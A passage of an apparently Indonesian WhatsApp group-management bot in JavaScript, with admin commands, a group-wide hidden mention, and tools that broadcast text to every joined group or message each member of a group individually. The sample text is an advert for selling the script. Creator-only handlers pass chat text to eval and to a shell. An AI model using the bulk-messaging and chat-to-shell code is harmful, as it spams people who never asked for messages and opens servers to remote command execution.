‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n══✪〘 *👥 Tag All* 〙✪══\n`
for (let mem of participants) {
teks += `➲ @${mem.id.split('@')[0]}\n`
}
yinzzofc.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted: msg })
}
break
case 'group': case 'grup': case 'gc':
if (!isGroup) return msg.reply(`Maaf Kak Fitur Ini Hanya Bisa Digunakan Didalam Group`)
if (!isAdmins) return msg.reply(`Maaf Kak Fitur Ini Khusus Creator Dan Admin Grup Saja`)
if (!isBotAdmins) return msg.reply(`Aduhh Maaf Kak Botnya Belum Dijadikan Admin Nihh`)
if (!q) return msg.reply(`Kirim perintah .${command} _options_\nOptions : close & open\nContoh : .${command} close`)
if (args[0] == "close") {
yinzzofc.groupSettingUpdate(from, 'announcement')
msg.reply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
} else if (args[0] == "open") {
yinzzofc.groupSettingUpdate(from, 'not_announcement')
msg.reply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
} else {
msg.reply(`Kirim perintah .${command} _options_\nOptions : close & open\nContoh : .${command} close`)
}
break
case 'out': {
                if (!isCreator) return msg.reply('Maaf Kak Fitur Ini Khusus Creator Bot')
                if (!q) return msg.reply(`Selamat Tinggal Semuanya`)
                await yinzzofc.groupLeave(msg.chat).then((res) => msg.reply(jsonformat(res))).catch((err) => mgs.reply(jsonformat(err)))
            }
            break
case 'lgc': case 'linkgc': {
if (!isCreator) return msg.reply('Maaf Kak Fitur Ini Khusus Creator Bot')
if (!isGroup) return msg.reply(`Maaf Kak Fitur Ini Hanya Bisa Digunakan Didalam Group`)
if (!isBotAdmins) return msg.reply(`Aduhh Maaf Kak Botnya Belum Dijadikan Admin Nihh`)
let response = await yinzzofc.groupInviteCode(from)
yinzzofc.sendText(from, `Hai Kak @${sender.split('@')[0]}\n\nIni Link Groupnya Ya Kak : https://chat.whatsapp.com/${response}\n\nGroup Name : ${groupMetadata.subject}`, msg, { detectLink: true })
}
break
case 'hidetag': {
if (!isCreator) return msg.reply('Maaf Kak Fitur Ini Khusus Creator Bot')
if (!isGroup) return msg.reply('Maaf Kak Fitur Ini Hanya Bisa Digunakan Didalam Group')
yinzzofc.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted:msg })
}
break
case 'kick': {
if (!isGroup) return msg.reply('Maaf kak fitur ini hanya bisa digunakan didalam group')
if (!isBotAdmins) return msg.reply('Aduhh Maaf Kak Botnya Belum Dijadikan Admin Nihh')
if (!isGroupAdmins) return msg.reply('Maaf kak fitur ini khusus admin grup')
let users = msg.mentionedJid[0] ? msg.mentionedJid[0] : msg.quoted ? msg.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await yinzzofc.groupParticipantsUpdate(msg.chat, [users], 'remove').then((res) => msg.reply(jsonformat(res))).catch((err) => msg.reply(jsonformat(err)))
}
break
case 'promote': {
if (!isCreator) return msg.reply('Maaf Kak Fitur Ini Khusus Creator Bot')
if (!isGroup) return msg.reply('Maaf kak fitur ini hanya bisa digunakan didalam group')
if (!isBotAdmins) return msg.reply(`Aduhh Maaf Kak Botnya Belum Dijadikan Admin Nihh`)
if (!isAdmins) return msg.reply(`Maaf Kak Fitur Ini Khusus Creator Dan Admin Grup Saja`)
let users = msg.mentionedJid[0] ? msg.mentionedJid[0] : msg.quoted ? msg.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await yinzzofc.groupParticipantsUpdate(from, [users], 'promote').then((res) => msg.reply(jsonformat(res))).catch((err) => msg.reply(jsonformat(err)))
}
break
case 'demote': {
if (!isCreator) return msg.reply('Maaf Kak Fitur Ini Khusus Creator Bot')
if (!isGroup) return msg.reply('Maaf kak fitur ini hanya bisa digunakan didalam group')
if (!isBotAdmins) return msg.reply(`Aduhh Maaf Kak Botnya Belum Dijadikan Admin Nihh`)
if (!isAdmins) return msg.reply(`Maaf Kak Fitur Ini Khusus Creator Dan Admin Grup Saja`)
let users = msg.mentionedJid[0] ? msg.mentionedJid[0] : msg.quoted ? msg.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await yinzzofc.groupParticipantsUpdate(from, [users], 'demote').then((res) => msg.reply(jsonformat(res))).catch((err) => msg.reply(jsonformat(err)))
}
break
case 'revoke':
if (!isCreator) return msg.reply('Maaf Kak Fitur Ini Khusus Creator Bot')
if (!isGroup) return msg.reply('Maaf kak fitur ini hanya bisa digunakan didalam group')
if (!isBotAdmins) return msg.reply(`Aduhh Maaf Kak Botnya Belum Dijadikan Admin Nihh`)
yinzzofc.groupRevokeInvite(from)
msg.reply(`Hai Kak *${pushname}* Bot Telah Sukses Mereset Link Group Ini`)
break
case 'tes':
case 'ping':{
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \nRuntime : ${runtime(process.uptime())}
💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
`
msg.reply(respon)
}
break
case 'join':{
if (!isCreator) return msg.reply('Maaf Kak Fitur Ini Khusus Creator Bot')
if (!q) return msg.reply(`Penggunaan ${prefix+command} linkgrup`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return msg.reply('Linknya salah kak')
let result = args[0].split('https://chat.whatsapp.com/')[1]
yinzzofc.groupAcceptInvite(result).then((res) => msg.reply(jsonformat(res))).catch((err) => msg.reply(jsonformat(err)))
}
msg.reply("Bot Telah Sukses Masuk Ke Dalam Group")
break
case "jpm":
            if (!isCreator) return msg.reply(`Maaf kak fitur ini khusus creator bot`)
            if (!text) throw `Menu ini hanya akan mengirim pesan ke dalam grup.\n\nContoh: ${prefix + command} Sc Bot PushkontakV3 30k Pm Cuyy Ada Fitur Jpm Dan Ada Fitur Langka Lainnya Yg Mau Buy Pm Wa https://wa.me/6281254698296`;
            let getGroups = await yinzzofc.groupFetchAllParticipating();
            let groups = Object.entries(getGroups)
              .slice(0)
              .map((entry) => entry[1]);
            let anu = groups.map((v) => v.id);
            msg.reply(`_Tunggu Sebentar Ya Kak.. Bot Sedang Mengirim Pesan Ke ${anu.length} Group_`);
            for (let i of anu) {
              await sleep(2000);
              let txt = `${text}`;
              yinzzofc.sendText(i, txt);
            }
            msg.reply(`Hai Kak Bot Telah Sukses Mengirim Pesan Ke ${anu.length} Group`);
break
case "push": case "pushkontak":
if (!isCreator) return msg.reply('Maaf kak fitur ini khusus creator bot')
if (!isGroup) return msg.reply(`Maaf Kak Fitur ${prefix+command} Hanya Bisa Di Gunakan Di Dalam Group\nUntuk Memasukan Bot Ke Dalam Group Yang Di Ingin Kan\nSilahkan Ketik Command .join linkgroup`)
if (!text) return msg.reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)
await msg.reply(`Sedang Mengirim Pesan Ke ${participants.length} Peserta`)
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
yinzzofc.sendMessage(men, { text: text })
await sleep(2000)
}
msg.reply(`Sukses Mengirim Pesan Ke ${participants.length} Peserta Group`)
break
case "pushv2": case "pushkontakv2":
if (!isCreator) return msg.reply('Maaf kak fitur ini khusus creator bot')
if (msg.isGroup) return msg.reply("Maaf Kak Fitur Ini Hanya Bisa Di Gunakan Di Private Chat")
if (!q) return msg.reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|tekspushkontak\nUntuk Liat Id Group Silahkan Ketik .idgroup`)
await msg.reply(`Tunggu Sebentar Bot Sedang Mengirim Pesan Ke Semua Peserta Group`)
const hay = q.split("|")[1]
const groupMetadataa = !msg.isGroup? await yinzzofc.groupMetadata(`${q.split("|")[0]}`).catch(e => {}) : ""
const participantss = !msg.isGroup? await groupMetadataa.participants : ""
const halls = await participantss.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
yinzzofc.sendMessage(mem, { text: hay })
await sleep(2000)
}
msg.reply(`Sukses Mengirim Pesan Ke Semua Peserta Group`)
break

default:
}
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return msg.reply(bang)
}
try {
msg.reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
} catch (e) {
msg.reply(String(e))
}
}
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await msg.reply(evaled)
} catch (err) {
msg.reply(String(err))
}
}
if (budy.startsWith('<')) {
if (!isCreator) return
try {
return msg.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
if (budy.startsWith('$')){
if (!isCreator) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return msg.reply(`${err}`)
if (stdout) {
msg.reply(stdout)
}
})
}
} catch (err) {
msg.reply(util.format(err))
}
} 